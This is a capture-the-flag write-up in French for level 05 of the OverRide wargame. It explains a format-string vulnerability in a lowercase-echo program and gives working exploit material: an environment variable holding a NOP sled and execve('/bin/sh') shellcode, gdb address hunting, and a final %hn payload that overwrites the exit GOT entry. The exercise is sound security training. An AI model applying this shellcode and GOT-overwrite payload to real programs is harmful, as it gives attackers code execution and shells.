# Level 05

Le code decompilé nous montre un programme qui attend une entrée utilisateur et retourne la meme chaine en minuscule.

Le printf non securise est la faille a exploiter.

```
64|f7fcfac0|f7ec3add|ffffd6ef|ffffd6ee|0|ffffffff|ffffd774|f7fdb000|257c7825|78257c78|
level05@OverRide:~$ ./level05
AAAA%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|
aaaa64|f7fcfac0|f7ec3add|ffffd6ef|ffffd6ee|0|ffffffff|ffffd774|f7fdb000|61616161|257c7825|78257c78|
```

Nous pouvons utiliser l'emplacement 10 pour ecrire dans la memoire.

Nous allons ecrire un shellcode avec nopsled dans une variable d'environnement, puis trouver son adresse dans gdb.


```
export EXPLOIT=$(python -c 'print "\x90" * 500 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')

level05@OverRide:~$ gdb ./level05
(gdb) b main
Breakpoint 1 at 0x8048449
(gdb) run
Starting program: /home/users/level05/level05

Breakpoint 1, 0x08048449 in main ()

(gdb) x/200s environ

0xffffd6e1:      "EXPLOIT=\...
0xffffd7a9:      <=== On prend cette adresse pour tomber dans le nopsled
\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xffffd871:      "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343PS\211\341\260\v̀"

```

ATTENTION, l'adresse de la variable de l'environnement peut changer quand on redefini la variable.

Convertir l'adresse 0xffffd7a9 en decimal, donne un nombre trop grand, nous allons devoir couper l'adresse en deux 0xffff (65535) et 0xd7a9 (55209).

Enfin, nous devons trouver quelle adresse override pour sauter vers le shellcode.
Pour ca allons dans gdb.

```
disas main
0x08048513 <+207>:   call   0x8048370 <exit@plt>
```
La derniere commande exit.

```
(gdb) disas exit
0x08048370 <+0>:     jmp    *0x80497e0
```
La fonction jump a cette adresse 0x80497e0, et comme on a 8 bits a override, on ecrira a l'adresse 4 bits plus loin, c'est a dire 0x80497e2.

Pour arriver a la bonne adresse, on fait 65535 - 55208 = 10326.
On rempli la premiere adresse avec le decimal 55209 - 8 (les 8 bits des deux adresses d'avant) et la deuxieme le reste 10326.

La commande finale :
```
 (python -c 'print "\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%55201c"+"%10$hn"+"%10326c"+"%11$hn"' ; cat -) | ./level05
```